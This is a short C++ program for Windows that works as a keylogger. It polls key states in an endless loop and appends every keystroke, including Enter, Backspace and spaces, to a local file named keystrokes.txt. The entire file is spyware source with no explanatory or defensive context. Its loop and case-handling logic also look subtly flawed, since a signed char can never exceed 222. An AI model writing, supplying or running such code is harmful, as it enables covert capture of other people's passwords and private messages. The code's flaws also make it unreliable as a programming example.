#include <iostream>
#include <fstream>
#include <Windows.h>

using namespace std;

int main() {
    ofstream keystroke_file("keystrokes.txt", ios::app);
    if (!keystroke_file) {
        cerr << "Error opening file." << endl;
        return 1;
    }

    char c;
    while (true) {
        for (c = 8; c <= 222; c++) {
            if (GetAsyncKeyState(c) == -32767) {
                if (c == VK_RETURN) {
                    keystroke_file << endl;
                    keystroke_file.flush();  // Flush the output buffer to write to the file
                } else if (c == VK_BACK) {
                    keystroke_file << "<BACKSPACE>";
                    keystroke_file.flush();  // Flush the output buffer to write to the file
                } else if (c == VK_SPACE) {
                    keystroke_file << " ";
                    keystroke_file.flush();  // Flush the output buffer to write to the file
                } else {
                    if (((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z')) && !(GetAsyncKeyState(VK_SHIFT) & 0x8000)) {
                        // Convert uppercase letters to lowercase
                        if (c >= 'A' && c <= 'Z') {
                            c += 32;
                        }
                        keystroke_file << c;
                        keystroke_file.flush();  // Flush the output buffer to write to the file
                    } else {
                        keystroke_file << c;
                        keystroke_file.flush();  // Flush the output buffer to write to the file
                    }
                }
            }
        }
    }

    keystroke_file.close();
    return 0;
}
